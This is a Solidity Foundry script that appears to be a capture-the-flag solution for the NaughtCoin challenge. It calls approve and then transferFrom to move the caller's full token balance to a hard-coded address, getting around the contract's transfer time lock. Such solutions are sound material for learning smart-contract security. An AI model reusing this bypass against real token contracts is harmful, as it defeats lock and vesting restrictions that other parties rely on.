// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../../src/NaughtCoin/NaughtCoin.sol"; // Import your NaughtCoin contract

contract AttackNaughtCoin is Script {
    function run() external {
        vm.startBroadcast();

        // Address of the deployed NaughtCoin contract
        address deployedContractAddress = 0x101371F98A919C21C50D09f6C7dc3Ef83944Bdc5;

        // Create an instance of the deployed NaughtCoin contract
        NaughtCoin naughtCoin = NaughtCoin(deployedContractAddress);

        uint256 amount = naughtCoin.balanceOf(msg.sender);
        naughtCoin.approve(msg.sender, amount);
        bool success = naughtCoin.transferFrom(msg.sender, 0x60C7A23B85903EE6B5598e2800865E0AC35d94f9, amount);
        require(success, "Transfer failed");

        console.log("Transferred", amount, "tokens to", 0x60C7A23B85903EE6B5598e2800865E0AC35d94f9);

        vm.stopBroadcast();
    }
}
